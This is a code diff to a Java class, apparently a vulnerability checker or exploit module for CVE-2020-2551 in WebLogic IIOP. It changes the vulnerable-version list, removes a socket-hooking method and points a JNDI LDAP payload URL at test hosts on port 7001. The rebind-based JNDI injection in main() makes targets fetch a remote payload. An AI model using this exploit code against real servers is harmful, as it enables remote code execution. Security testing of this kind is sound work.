@@ -52,7 +52,9 @@ public class CVE_2020_2551 implements VulTest {
      */
     public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
         add("10.3.6.0");
+        add("10.3.6.0.0");
         add("12.1.3.0");
+        add("12.1.3.0.0");
         add("12.2.1.3.0");
         add("12.2.1.4.0");
     }};
@@ -106,6 +108,7 @@ public class CVE_2020_2551 implements VulTest {
         try{
             context.rebind("hello",object);
         }catch (Exception e){
+//            e.printStackTrace();
             String msg = e.getMessage();
             if("Unhandled exception in rebind()".equals(msg)){
                 urlClassLoader.close();
@@ -146,42 +149,6 @@ public class CVE_2020_2551 implements VulTest {
     }
 
     /**
-     * hook socket
-     * @param ip ip
-     * @param port port
-     * @throws Exception
-     */
-    public ClassPool hookSocket(String ip, Integer port) throws Exception {
-        ClassPool cp = ClassPool.getDefault();
-//        String path = this.getClass().getResource("/lib/").getPath();
-//        String fullClientPath = path + FULL_CLIENT;
-//        cp.insertClassPath(fullClientPath);
-        CtClass ctClass = cp.get(IIOP_SOCKET_CLASS_NAME);
-        String code = "{" +
-                "$1 = java.net.InetAddress.getByName(\"" + ip + "\");\n" +
-                "$2 = " + port + ";}";
-        code = "{\n" +
-                "    java.net.InetAddress inet = java.net.InetAddress.getByName(\""+ip+"\");\n" +
-                "    $1 = inet;\n" +
-                "    java.net.Socket var4 = new java.net.Socket();\n" +
-                "    initSocket(var4);\n" +
-                "    var4.connect(new java.net.InetSocketAddress($1, $2), $3);\n" +
-                "    return var4;\n" +
-                "}";
-//        CtMethod ctMethod = ctClass.getDeclaredMethod("connect", new CtClass[]{cp.get(InetAddress.class.getName()), cp.get("int")});
-//        ctMethod.insertBefore(code);
-        CtMethod ctMethod = ctClass.getDeclaredMethods("newSocket")[1];
-        if(ctClass.isFrozen()){
-            ctClass.defrost();
-        }
-        ctMethod.setBody(code);
-        ctClass.writeFile();
-//        ctClass.toClass();
-        ctClass.freeze();
-        return cp;
-    }
-
-    /**
      * 漏洞利用
      * @param ip ip
      * @param port 端口
@@ -195,9 +162,12 @@ public class CVE_2020_2551 implements VulTest {
     public static void main(String[] args) throws Exception {
         CVE_2020_2551 vul = new CVE_2020_2551();
         String jdnUrl = "ldap://192.168.1.6:1099/poc";
-        System.out.println(vul.vulnerable("192.168.1.3", 7001,jdnUrl));
-        System.out.println(vul.vulnerable("192.168.1.10", 7001,jdnUrl));
-        System.out.println(vul.vulnerable("192.168.1.12", 7001,jdnUrl));
+        jdnUrl = "ldap://10.10.10.172:1099/poc";
+//        System.out.println(vul.vulnerable("10.10.10.172", 7001,jdnUrl));
+//        System.out.println(vul.vulnerable("10.10.10.168", 7001,jdnUrl));
+        System.out.println(vul.vulnerable("10.10.10.173", 7001,jdnUrl));
+        System.out.println(vul.vulnerable("10.10.10.162", 7001,jdnUrl));
+        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));
 
 //        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
     }
